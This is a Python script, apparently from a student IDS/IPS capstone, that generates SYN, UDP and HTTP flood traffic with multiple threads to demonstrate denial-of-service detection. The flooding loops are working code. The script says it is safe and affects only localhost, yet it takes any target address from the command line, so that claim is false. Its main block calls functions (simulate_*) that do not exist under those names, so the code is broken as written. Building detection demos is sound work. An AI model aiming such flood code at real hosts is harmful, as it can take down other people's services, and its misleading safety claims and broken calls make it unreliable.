#!/usr/bin/env python3
"""
Simulate DoS/Flood Attack Patterns for Demo
CSCI480 Layered IDS/IPS - Senior Capstone Project
Educational tool for demonstrating DoS detection
"""

import socket
import time
import threading
import random
from datetime import datetime

def generate_syn_flood(target_ip, target_port, duration_seconds=30, threads=10):
    """
    Simulate SYN flood attack pattern
    Safe: Generates traffic to localhost, not actual attack
    """
    print("=" * 70)
    print("CSCI480 LAYERED IDS/IPS - SYN FLOOD SIMULATOR")
    print("=" * 70)
    print()
    print(f"Target: {target_ip}:{target_port}")
    print(f"Duration: {duration_seconds} seconds")
    print(f"Threads: {threads}")
    print()
    print("[INFO] Starting SYN flood simulation...")
    print("[INFO] This generates high-volume connection attempts")
    print("[INFO] Safe: Only affects localhost, educational purpose only")
    print("[INFO] Press Ctrl+C to stop early")
    print()
    
    end_time = time.time() + duration_seconds
    packet_count = 0
    
    def flood_worker():
        nonlocal packet_count
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                
                # Attempt connection without completing handshake
                try:
                    sock.connect((target_ip, target_port))
                except:
                    pass  # Expected - we don't complete handshake
                
                sock.close()
                packet_count += 1
                
            except Exception:
                pass
    
    # Start multiple threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood_worker)
        t.daemon = True
        thread_list.append(t)
        t.start()
    
    try:
        # Monitor progress
        while time.time() < end_time:
            time.sleep(1)
            elapsed = int(time.time() - (end_time - duration_seconds))
            print(f"[STATUS] Packets sent: {packet_count} | Elapsed: {elapsed}s")
        
        for t in thread_list:
            t.join(timeout=1)
            
    except KeyboardInterrupt:
        print("\n[INFO] SYN flood stopped by user")
    
    print()
    print(f"[INFO] SYN flood simulation complete")
    print(f"[INFO] Total packets sent: {packet_count}")

def generate_udp_flood(target_ip, target_port, duration_seconds=30, threads=10):
    """
    Simulate UDP flood attack pattern
    Safe: Generates UDP traffic to localhost
    """
    print("=" * 70)
    print("CSCI480 LAYERED IDS/IPS - UDP FLOOD SIMULATOR")
    print("=" * 70)
    print()
    print(f"Target: {target_ip}:{target_port}")
    print(f"Duration: {duration_seconds} seconds")
    print(f"Threads: {threads}")
    print()
    print("[INFO] Starting UDP flood simulation...")
    print("[INFO] This generates high-volume UDP packets")
    print("[INFO] Safe: Only affects localhost, educational purpose only")
    print("[INFO] Press Ctrl+C to stop early")
    print()
    
    end_time = time.time() + duration_seconds
    packet_count = 0
    
    def udp_worker():
        nonlocal packet_count
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Send random UDP data
                data = random.randbytes(64)
                sock.sendto(data, (target_ip, target_port))
                
                sock.close()
                packet_count += 1
                
            except Exception:
                pass
    
    # Start multiple threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=udp_worker)
        t.daemon = True
        thread_list.append(t)
        t.start()
    
    try:
        # Monitor progress
        while time.time() < end_time:
            time.sleep(1)
            elapsed = int(time.time() - (end_time - duration_seconds))
            print(f"[STATUS] Packets sent: {packet_count} | Elapsed: {elapsed}s")
        
        for t in thread_list:
            t.join(timeout=1)
            
    except KeyboardInterrupt:
        print("\n[INFO] UDP flood stopped by user")
    
    print()
    print(f"[INFO] UDP flood simulation complete")
    print(f"[INFO] Total packets sent: {packet_count}")

def generate_http_flood(target_ip, target_port, duration_seconds=30, threads=5):
    """
    Simulate HTTP flood attack pattern
    Safe: Generates HTTP requests to localhost
    """
    print("=" * 70)
    print("CSCI480 LAYERED IDS/IPS - HTTP FLOOD SIMULATOR")
    print("=" * 70)
    print()
    print(f"Target: {target_ip}:{target_port}")
    print(f"Duration: {duration_seconds} seconds")
    print(f"Threads: {threads}")
    print()
    print("[INFO] Starting HTTP flood simulation...")
    print("[INFO] This generates high-volume HTTP requests")
    print("[INFO] Safe: Only affects localhost, educational purpose only")
    print("[INFO] Press Ctrl+C to stop early")
    print()
    
    end_time = time.time() + duration_seconds
    request_count = 0
    
    def http_worker():
        nonlocal request_count
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                
                try:
                    sock.connect((target_ip, target_port))
                    
                    # Send HTTP GET request
                    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
                    sock.send(request.encode())
                    
                    # Don't wait for response to increase rate
                    
                except:
                    pass
                
                sock.close()
                request_count += 1
                
            except Exception:
                pass
    
    # Start multiple threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=http_worker)
        t.daemon = True
        thread_list.append(t)
        t.start()
    
    try:
        # Monitor progress
        while time.time() < end_time:
            time.sleep(1)
            elapsed = int(time.time() - (end_time - duration_seconds))
            print(f"[STATUS] Requests sent: {request_count} | Elapsed: {elapsed}s")
        
        for t in thread_list:
            t.join(timeout=1)
            
    except KeyboardInterrupt:
        print("\n[INFO] HTTP flood stopped by user")
    
    print()
    print(f"[INFO] HTTP flood simulation complete")
    print(f"[INFO] Total requests sent: {request_count}")

if __name__ == "__main__":
    import sys
    
    target = "127.0.0.1"  # Default to localhost
    port = 5000  # Default to dashboard port
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    if len(sys.argv) > 2:
        port = int(sys.argv[2])
    
    print("Choose flood type:")
    print("1. SYN Flood (TCP connection attempts)")
    print("2. UDP Flood (UDP packet flood)")
    print("3. HTTP Flood (HTTP request flood)")
    print()
    
    try:
        choice = input("Enter choice (1-3): ").strip()
        
        if choice == "1":
            simulate_syn_flood(target, port, duration_seconds=30, threads=10)
        elif choice == "2":
            simulate_udp_flood(target, port, duration_seconds=30, threads=10)
        elif choice == "3":
            simulate_http_flood(target, port, duration_seconds=30, threads=5)
        else:
            print("[INFO] Invalid choice, running SYN flood")
            simulate_syn_flood(target, port, duration_seconds=30, threads=10)
            
    except KeyboardInterrupt:
        print("\n[INFO] Exiting")
